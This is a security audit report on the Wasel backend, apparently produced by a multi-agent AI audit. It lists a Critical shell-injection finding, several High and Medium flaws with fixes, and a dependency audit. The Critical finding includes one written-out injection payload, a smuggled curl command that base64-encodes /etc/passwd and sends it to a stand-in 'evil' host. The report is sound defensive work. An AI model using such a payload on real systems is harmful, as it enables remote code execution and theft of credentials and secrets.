# Wasel Backend — Security & Bug Audit

| | |
|---|---|
| **Date** | 2026-06-12 |
| **Scope** | `backend/src` — all 13 route files (~89 endpoints), middleware, services, jobs, crypto. Mobile app, admin SPA, and FreeRADIUS/WireGuard configs were out of scope (see §6). |
| **Method** | 7 parallel dimension finders → dedup → 1 adversarial verifier per finding (re-read each code path to refute it) → completeness critic. Plus `tsc`, full test suite, `npm audit`. |
| **Status** | Findings report — **no code changed**. Pick what to fix in a follow-up. |
| **⚠️ Handling** | This file enumerates exploitable weaknesses. It is intentionally **untracked / not committed**. Decide whether to keep it local, move it to a private tracker, or delete it after triage. |

> **Note on the worst issue:** there is a confirmed **remote-code-execution path (Critical)** reachable by any operator who controls one of their own paired routers. Treat F1 as the priority. The verifier confirmed every reported finding (0 refuted); duplicates from multiple finders have been consolidated below.

## Executive summary

| Severity | Count | Theme |
|---|---|---|
| **Critical** | 1 | Shell-command injection → RCE in the RADIUS CoA-disconnect paths |
| **High** | 4 | Quota race, unbounded bulk operations, refresh-token replay, orphan RADIUS credentials |
| **Medium** | 7 | Unauthenticated receipt files, stale token revocation gaps, cross-tenant RADIUS-group clobbering, non-transactional delete, wrong-session disconnect, missing audit log |
| **Low** | 22 | User enumeration, JWT alg not pinned, email case-sensitivity, info disclosure, missing caps/timeouts (full list §4) |

**Mechanical signals:** `tsc --noEmit` clean (exit 0). Test suite **173/173 pass** (14 files). `npm audit --omit=dev`: **18 vulnerabilities (3 high, 14 moderate, 1 low)** — all in transitive dependencies of `firebase-admin` and `express-rate-limit`; details and remediation in §5.

---

## 1. Critical

### F1 — Shell-command injection (RCE) in RADIUS CoA-disconnect paths
**Files:** `backend/src/services/session.service.ts:141` and `backend/src/services/voucher.service.ts:957` (two call sites, one root cause).

Both call sites build a shell command by string-interpolating values that originate from the `radacct` table, then run it through `child_process.exec()` (which invokes `/bin/sh -c`):

```js
// session.service.ts:141
const radclientCmd = `echo "Acct-Session-Id=${acctsessionid},User-Name=${username}" | radclient ${tunnelIp}:3799 disconnect ${radiusSecret}`;
exec(radclientCmd, (error, stdout, stderr) => { ... });

// voucher.service.ts:957 (inside sendCoaDisconnect, dynamic import of exec)
const coaCommand = `echo "Acct-Session-Id=${session.acctsessionid},User-Name=${username}" | radclient ${router.tunnel_ip}:3799 disconnect ${radiusSecret}`;
await execAsync(coaCommand, { timeout: 5000 });
```

`radacct.acctsessionid` is `VARCHAR(64)` with no charset constraint (`migrations/sql/002_freeradius_tables.sql:80`) and is written verbatim by FreeRADIUS from the `Acct-Session-Id` AVP in Accounting-Request packets sent by the operator's RouterOS box. RADIUS allows arbitrary opaque strings there.

**Exploit:** An operator who controls or compromises one of their own paired routers (they hold their own NAS shared secret) sends an Accounting-Start with `Acct-Session-Id = x";curl https://evil/$(cat /etc/passwd|base64);#`. FreeRADIUS persists it. When the operator later clicks **Disconnect** on that session in the app (`DELETE /routers/:id/sessions/:sid`), or **deletes a voucher** (`DELETE /routers/:id/vouchers/:vid` / `POST .../bulk-delete`), the payload executes as the backend process user. That process holds `process.env.ENCRYPTION_KEY` (the AES-256-GCM master key for **every tenant's** router credentials, WireGuard private keys, and RADIUS secrets), the JWT signing secrets, and Postgres credentials. One malicious tenant → full multi-tenant compromise. The failure path is fire-and-forget with warn-level logging only, so exploitation is silent.

**Secondary issue at the same sink:** the decrypted `radiusSecret` is passed as an argv token to `/bin/sh -c`, so it appears in `/proc/<pid>/cmdline` and `ps auxww` for any local process during execution.

**Fix:** Both call sites should use the **already-correct** `sendDisconnectRequest()` in `backend/src/services/radclient.service.ts:131` — it uses `spawn('radclient', argv)` (no shell) and feeds attributes via stdin with quote-escaping. The cron path (`jobs/validityCoaDisconnect.ts`) already uses it; these two were never migrated. Delete the `exec`/`child_process` usage from both files. Belt-and-suspenders: reject any `radacct.acctsessionid` containing characters outside `[A-Za-z0-9._-]` before use. **Size: S** (the safe helper exists; this is a swap at two call sites).

---

## 2. High

### F2 — TOCTOU race in voucher quota lets a user overshoot `voucher_quota`
**Files:** `backend/src/middleware/checkQuota.ts:8`, `backend/src/services/subscription.service.ts:427`, increment at `backend/src/services/voucher.service.ts:513`.

`checkQuota` does a plain `SELECT`-based `count <= remaining` comparison with no row lock, in a request scope separate from the transaction that later runs the unconditional `UPDATE subscriptions SET vouchers_used = vouchers_used + $1 WHERE user_id=$2 AND status='active'` (no `AND vouchers_used + $1 <= voucher_quota` guard).

**Exploit:** A Starter user (quota 500, used 499) fires two concurrent `POST /routers/:id/vouchers` with `count=N`; both read the same `vouchers_used`, both pass the check, both increment — creating up to `2N` over quota. Repeatable every cycle; defeats the paid-tier model. Bounded to the user's own router (not cross-tenant).

**Fix:** Make enforcement atomic inside the transaction: `UPDATE subscriptions SET vouchers_used = vouchers_used + $1 WHERE user_id=$2 AND status='active' AND (voucher_quota = -1 OR vouchers_used + $1 <= voucher_quota) RETURNING vouchers_used`; if `rowCount === 0`, roll back before inserting any `voucher_meta`/`radcheck` rows. Keep `checkQuota` only as a cheap pre-check. **Size: S.**

### F3 — Unbounded count on voucher create and bulk-delete (resource exhaustion / DoS)
**Files:** `backend/src/validators/voucher.validators.ts:28` (create `count` has `.min(1)` but **no `.max`**) and `:60` (bulk-delete `filter` mode has no row cap).

```js
count: z.number().int().min(1, 'Count must be at least 1'),  // no upper bound
```

`checkVoucherQuota` returns `true` immediately for Enterprise (`voucher_quota === -1`), so an Enterprise user can `POST count=10000000`. `createVouchers` then holds a single pool connection (`pool.max=10`) for a serial loop of ~4–5 INSERTs per voucher, plus a pre-check `WHERE username = ANY($1)` with a 10M-element array (pg-driver memory blow-up). Minutes-to-hours of pool starvation degrade voucher/auth/dashboard queries for **all** tenants. Non-Enterprise tiers are bounded by quota but can still submit `count = remaining` in one transaction. Bulk-delete `filter` mode fans out one CoA disconnect per matched voucher with no cap.

**Fix:** Add `.max(500)` to `count` (matching the existing bulk-delete `ids` cap); cap `filter`-mode bulk-delete; chunk `createVouchers` (e.g. 100/transaction, releasing the client between chunks) and use multi-row INSERTs. **Size: S–M.**

### F4 — Refresh-token rotation race allows a single refresh token to be redeemed twice
**File:** `backend/src/services/auth.service.ts:153-159` (`isRefreshTokenValid` then `revokeRefreshToken` as two non-atomic Redis ops — `EXISTS` then `DEL`).

**Exploit:** With a stolen refresh token (e.g. admin-panel XSS, device backup), the attacker races their `POST /auth/refresh` against the victim's. Both observe `exists===1`, both `DEL` (return value unchecked), both issue independent valid `(access, refresh)` pairs. The single-use invariant of rotation is broken, the attacker gets a self-renewing 7-day foothold, and reuse-detection becomes impossible.

**Fix:** Make consume-on-rotate atomic — a Lua `if redis.call('DEL', KEYS[1]) == 1 then return 1 else return 0 end` (mirrors the existing `LUA_INCR_EXPIRE` in `token.service.ts:101`) or `GETDEL` (Redis ≥6.2). Only the caller that observes `DEL=1` may issue a new pair. This also unlocks a future "reuse detected → revoke all sessions" signal. **Size: S.**

### F5 — Router deletion orphans RADIUS credentials that still authenticate
**File:** `backend/src/services/router.service.ts:345-390`.

`deleteRouter` removes the `nas` row, the tunnel subnet, and the `routers` row. `voucher_meta` cascades, but `radcheck`/`radreply`/`radusergroup` have **no FK** to `voucher_meta`/`routers` and are not cleaned up. Per the deliberate design note at `voucher.service.ts:343-352`, vouchers authenticate on **any** NAS presenting a valid shared secret.

**Exploit:** Create router R1, generate vouchers, delete R1. The `Cleartext-Password` rows persist. Those usernames now still authenticate on the operator's next router — or on **any other tenant's** NAS — until per-voucher cumulative limits exhaust. Anyone holding a printed slip rides for free.

**Fix:** Inside the `deleteRouter` transaction (see F8), snapshot the soon-to-cascade `radius_username`s and `DELETE FROM radcheck/radreply/radusergroup WHERE username = ANY($1)` before deleting the router. Belt-and-suspenders: add `ON DELETE CASCADE` FKs from those tables to `voucher_meta(radius_username)`. (Same orphan class exists in admin user-deletion, `admin.service.ts:217` — worth the same sweep.) **Size: M.**

---

## 3. Medium

| # | Finding | File | Fix sketch |
|---|---|---|---|
| F6 | **Payment receipts served unauthenticated** with guessable filenames from `/uploads` static handler — any unauthenticated client who guesses/derives a filename downloads another tenant's bank receipt (financial PII). | `backend/src/app.ts:46-56` | Replace the static mount with an authenticated route that checks the requesting user owns the payment (or is admin); store receipts outside the static root. |
| F7 | **Admin deactivate / password-reset does not revoke refresh tokens** — a disabled or compromised admin keeps a working 7-day refresh token (and ≤15-min access token). | `backend/src/services/admin.service.ts:941-1011` | Call the existing revoke-all-for-user (SCAN `refresh:{userId}:*`) on deactivate and on password reset. |
| F8 | **`deleteRouter` runs outside a transaction** — partial failure leaves the `nas` row deleted but the `routers` row present (or vice versa), and interacts with F5. | `backend/src/services/router.service.ts:345-390` | Wrap in `BEGIN`/`COMMIT` with `client` + `try/finally release`. |
| F9 | **Deactivated users keep access for ≤15 min** — `authenticate` never checks `is_active`, so a disabled/deleted user's unexpired access token still works. (Partly the documented JWT TTL trade-off, but no `is_active` check exists at all.) | `backend/src/middleware/authenticate.ts:6-27` | Add an `is_active`/existence check (cached) in `authenticate`, or revoke-all + short-circuit on deactivate. |
| F10 | **Cross-tenant RADIUS-group clobbering** — `radius_profiles` is `UNIQUE(user_id, group_name)` (per-user) but `radgroupcheck`/`radgroupreply` are keyed by `groupname` only. Two tenants picking the same group name read/overwrite/delete each other's group attributes; `updateProfile`/`deleteProfile` issue `DELETE ... WHERE groupname=$1` with no tenant filter. Auth-time impact is currently nil (vouchers store `group_profile=NULL`), but becomes **Critical** the moment voucher↔group linkage ships. | `backend/src/services/profile.service.ts:77, 311-313, 399-401` | Namespace groupname server-side as `${userId}-${groupName}`, or add `user_id` to the group tables and filter all DML on it. |
| F11 | **`disconnectSession` ignores the `:sid` param** — the SQL selects the most-recently-started active `radacct` row by `nasipaddress`, not the requested session, so the wrong session can be disconnected. (Correctness bug; also the trigger that makes F1 deterministically exploitable.) | `backend/src/services/session.service.ts:131-141` | Scope the `radacct` lookup by the requested `acctsessionid`/`:sid`. |
| F12 | **`PUT /admin/settings/bank` is not written to `audit_logs`** — changing the bank account customers pay into leaves no audit trail (and the value renders in the mobile app — review for stored-content risk). | `backend/src/controllers/settings.controller.ts:18-43` | Write an `audit_logs` row on bank-settings change, like other admin mutations. |

---

## 4. Low (22) — hygiene / defense-in-depth

These were reported by finders but not put through the adversarial verifier (Lows are pass-through). Worth a batch cleanup, not urgent.

**Auth / enumeration**
- User enumeration: `/auth/register` returns `409 EMAIL_EXISTS`; `resendVerification` distinguishes verified vs unknown; `forgotPassword` behavior differs by account state. (`auth.service.ts:50, 199, 221`)
- JWT verification does not pin `algorithms: ['HS256']` (jsonwebtoken@9 rejects `alg=none` by default, so defense-in-depth). (`token.service.ts:43`)
- Never-verified users keep working tokens indefinitely — refresh path doesn't require `is_verified`. (`auth.service.ts:50-74,145`)
- Email is case-sensitive `UNIQUE` with no `LOWER` index: duplicate `User@x`/`user@x` accounts possible, and OTP/lockout keys disagree on casing (OTP keyed raw-case, attempt counter lowercased). (`auth.service.ts:51,221`; `token.service.ts:115,153`)

**Crypto / info disclosure**
- Modulo bias in voucher username/password, RADIUS secret, and payment reference-code generation. (`utils/encryption.ts:90-100`)
- `errorHandler` returns `err.message` when `NODE_ENV !== 'production'` — can carry pg constraint/value detail in staging. (`middleware/errorHandler.ts:28`)
- `GET /admin/routers` (`SELECT r.*`) returns the `*_enc` credential ciphertexts in the response. (`admin.service.ts:773`)
- Unsanitized HTML interpolation of user `name` into the verification email body. (`email.service.ts:26-37`)

**Resource / limits**
- Rate limiter **fails closed** (HTTP 500 on every `/api/*`) when Redis is down — the code comment claims fail-open. Decide which you want. (`middleware/rateLimiter.ts:21`)
- Cron jobs have no reentrancy guard — a >30s tick overlaps the next on the same dataset. (`jobs/usageLimitEnforcement.ts:15`, and the other 30s jobs)
- RouterOS connect timeout 30s × 2 retries → a single request can hold a thread ~92s. (`routerOs.service.ts:142`)
- 10MB JSON body limit on every route; no per-user rate limit on receipt upload. (`app.ts:33`; `routes/subscription.routes.ts:39`)
- `createVouchers` pre-check `ANY($1)` with a huge array (see F3). (`voucher.service.ts:468`)

**Logic / state**
- Multiple pending subscriptions creatable via request race. (`subscription.service.ts:200-296`)
- `requireSubscription` expired read-only grace branch is unreachable dead code (no security impact). (`middleware/requireSubscription.ts:14-25`)
- Admin support replies / read-marks not audit-logged. (`support.controller.ts:107`)
- Orphan receipt file left on disk when upload is rejected for a cross-tenant `paymentId`; receipt filename leaks owner UUID. (`subscription.controller.ts:60`; `upload.ts:32`)
- Upload extension is taken from client `originalname` and preserved on disk (mitigated by `Content-Disposition: attachment` + `nosniff`). (`upload.ts:35`)

---

## 5. Dependency audit (`npm audit --omit=dev`)

18 vulnerabilities (3 high, 14 moderate, 1 low), **all transitive** — none in first-order Wasel code:

- **`firebase-admin` tree** (most of them): `protobufjs` (high — code injection / prototype pollution / DoS), `@grpc/grpc-js` (high — malformed-message crash), `uuid`, `@google-cloud/*`, `fast-xml-parser`/`fast-xml-builder`. Reachable only via FCM push paths.
- **`express-rate-limit` → `ip-address`** (moderate — XSS in `Address6` HTML emitters; not used by Wasel) and **`qs`** (moderate DoS).

Most fix cleanly with `npm audit fix`. `firebase-admin` and `file-type` need major bumps (`npm audit fix --force` → `firebase-admin@14`, `file-type@22` — breaking, test before shipping). Recommend: run `npm audit fix` now for the non-breaking set, schedule the `firebase-admin` major bump separately.

---

## 6. Not covered (flagged by the completeness critic — recommend follow-up)

- **FreeRADIUS server config** (`rlm_sql`, `sites-enabled`, dynamic-clients, virtual-server policy) — the *actual* enforcement point for voucher status and per-NAS scoping. Backend code can be correct while a mis-scoped RADIUS deployment authenticates everyone. **Audit separately.**
- **Cross-tenant leakage via reused tunnel `/30` subnets:** `dashboard.service.ts` and `report.service.ts` JOIN `radacct ON nasipaddress = r.tunnel_ip`; `releaseTunnelSubnet()` only NULLs `router_id` — historical `radacct` rows keyed on that IP persist. When a freed `/30` is reissued to another tenant, data-usage and active-session widgets may aggregate the previous tenant's sessions. (Voucher-count widgets are safe — joined through `voucher_meta.user_id`.)
- **Intentional weak isolation:** per-voucher NAS scoping was deliberately removed (`voucher.service.ts:343-352`); combined with a global `radcheck` namespace and 8-digit numeric usernames (10⁸ shared keyspace), a tenant who guesses/reads another's voucher username can use it on their own router. Documented choice — worth re-evaluating.
- **`wireguardPeer.syncConfigFile`** (`wireguardPeer.ts:179`) runs `wg syncconf` via shell — confirm no controller path reaches it with user-influenced `configContent`.
- **`routerOs.service.disconnectHotspotUser`** — whether the `routeros-client` lib escapes a malicious `sessionId` (RouterOS API command injection) was not verified.
- **Admin support endpoints** (`listConversations`, `sendAdminReply`), **report date-range bounds** (unbounded `radacct` scans), **`admin.listUsers` search** (unindexed → seq scans), and **HPP × Zod array coercion** on admin list queries — not deeply traced.

---

*Generated by a multi-agent audit (find → adversarially verify → critique). Every Critical/High/Medium finding above carries verifier-confirmed `file:line` evidence; 0 findings were refuted on verification. Severity tiers were recalibrated by the critic (5 raw CoA-injection reports collapsed to one Critical root cause across two call sites; 3 refresh-race reports collapsed to one High).*
